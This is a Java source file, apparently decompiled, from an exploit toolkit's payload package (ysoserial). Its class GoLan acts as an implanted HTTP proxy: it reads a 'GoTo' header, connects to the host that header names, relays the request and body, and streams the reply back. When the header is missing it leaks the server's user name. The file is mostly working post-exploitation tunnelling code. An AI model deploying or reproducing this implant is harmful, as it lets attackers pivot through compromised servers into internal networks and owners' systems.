package ysoserial.payloads.util;

import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;

public class GoLan extends BaseX3 {
   public GoLan() {
   }

   public boolean c() throws Exception {
      SocketChannel var1 = null;

      try {
         StringBuffer var2 = new StringBuffer();
         String var4 = "\r\n";
         String var5 = "Host";
         String var6 = "GoTo";
         String var7 = ":";
         String var8 = " ";
         String var9 = this.r.getHeader(var6);
         if (var9 != null) {
            boolean var10 = true;
            boolean var11 = true;
            URL var12 = new URL(var9);
            var2.append(this.r.getMethod()).append(var8).append(var12.getPath()).append(var8).append(this.r.getProtocol()).append(var4);
            var2.append(var5 + var7).append(var12.getHost()).append(var7).append(var12.getPort()).append(var4);
            Enumeration var13 = this.r.getHeaderNames();

            while(var13.hasMoreElements()) {
               String var3 = (String)var13.nextElement();
               if (!var3.equalsIgnoreCase(var5) && !var3.equalsIgnoreCase(var6)) {
                  var2.append(var3).append(var7).append(this.r.getHeader(var3)).append(var4);
               }
            }

            var2.append(var4);
            if (var12 != null) {
               ByteBuffer var14 = null;
               var1 = SocketChannel.open();
               var1.connect(new InetSocketAddress(var12.getHost(), var12.getPort()));
               var1.configureBlocking(false);
               var14 = ByteBuffer.allocate(var2.length());
               var14.clear();
               var14.put(var2.toString().getBytes());
               var14.flip();

               while(var14.hasRemaining()) {
                  var1.write(var14);
               }

               int var15 = this.r.getContentLength();
               if (var15 > 0) {
                  byte[] var16 = new byte[var15];
                  this.r.getInputStream().read(var16, 0, var15);
                  var14 = ByteBuffer.allocate(var15);
                  var14.clear();
                  var14.put(var16);
                  var14.flip();

                  while(var14.hasRemaining()) {
                     var1.write(var14);
                  }
               }

               int var35;
               while(-1 < (var35 = var1.read(var14))) {
                  if (var35 > 0) {
                     this.o.write(var14.array(), 0, var35);
                  }

                  this.o.flush();
                  var14.clear();
               }
            }
         } else {
            this.o.write((System.getProperty("user.name") + var4 + var2.toString()).getBytes());
         }
      } catch (Exception var33) {
      } finally {
         if (var1 != null) {
            try {
               var1.socket().close();
            } catch (Throwable var32) {
            }
         }

         if (this.o != null) {
            try {
               this.o.flush();
            } catch (Throwable var31) {
            }

            try {
               this.o.close();
            } catch (Throwable var30) {
            }
         }

      }

      return true;
   }
}
